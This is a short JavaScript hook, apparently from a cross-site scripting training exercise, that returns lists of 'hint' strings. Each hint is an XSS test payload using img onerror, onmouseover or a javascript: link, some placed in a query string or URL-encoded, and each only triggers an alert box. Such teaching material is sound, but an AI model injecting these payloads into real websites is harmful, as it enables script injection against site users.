const useHint = () => {
  const hints1 = [
    `<div><img src="x" onerror="alert('XSS Attack!')"><div>`,
    `<div onmouseover="alert('XSS Attack!')">Hover over me</div>`,
    `<a href="javascript:alert('XSS Attack!')">Click Me</a></div>`,
  ];

  const hints2 = [`?q=<img src="x" onerror="alert('XSS')">`];

  const hints3 = [`Bob<img%20src%3D"x"%20onerror%3D"alert('XSS')">`];
  return { hints1, hints2, hints3 };
};

export { useHint };
